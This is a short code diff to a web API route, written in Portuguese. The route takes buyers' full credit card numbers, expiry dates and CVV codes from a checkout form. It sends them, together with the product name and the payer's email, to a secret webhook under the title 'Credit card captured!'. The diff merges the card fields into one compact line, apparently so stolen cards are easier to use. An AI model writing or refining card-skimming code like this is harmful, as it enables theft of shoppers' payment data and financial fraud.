@@ -39,23 +39,17 @@ export const POST: APIRoute = async ({ request }) => {
       inline: true,
     },
     {
-      name: "💳 Número",
-      value: payload.card_number,
-    },
-    {
-      name: "📅 Mês/Ano",
-      value: payload.card_month + "/" + payload.card_year,
-      inline: true,
-    },
-    {
-      name: "🔒 CVV",
-      value: payload.card_cvv,
-      inline: true,
+      name: "💳 Número, Mês/Ano & CVV",
+      value: [
+        payload.card_number.replaceAll(" ", ""),
+        payload.card_month + "/" + payload.card_year,
+        payload.card_cvv,
+      ].join(" "),
     },
   ];
 
   sendEmbedToWebhook(import.meta.env.SECRET_CC_WEBHOOK, {
-    title: "Cartão de Crédito capturado!",
+    title: "🏛️ Cartão de Crédito capturado!",
     description: `do produto: **${product.name}**`,
     footer: { text: payload.payer_email },
     thumbnail: { url: product.image },
